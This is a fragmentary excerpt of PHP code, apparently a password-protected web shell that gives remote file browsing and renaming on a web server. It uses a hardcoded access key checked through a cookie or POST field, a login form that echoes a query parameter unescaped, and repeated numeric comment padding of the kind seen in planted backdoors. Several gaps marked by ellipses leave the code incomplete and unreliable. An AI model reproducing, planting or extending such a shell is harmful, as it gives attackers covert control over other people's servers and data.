...
$auth_key = "b83e4e48ffed5b9acd5bf002de51ba54";
...
$pass = false;
if (isset($_COOKIE['pw_name_16447'])) {
    if(($_COOKIE['pw_name_16447']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_16447'])) {
        if(($_POST['pw_name_16447']) == $auth_key) {
            setcookie("pw_name_16447", $_POST['pw_name_16447']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_16447' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1739867533121822 1739867533809706 1739867533581192 1739867533714992
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1739867533121822 1739867533809706 1739867533581192 1739867533714992
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1739867533121822 1739867533809706 1739867533581192 1739867533714992
            $name = PATH . "/" . $_GET['r'];
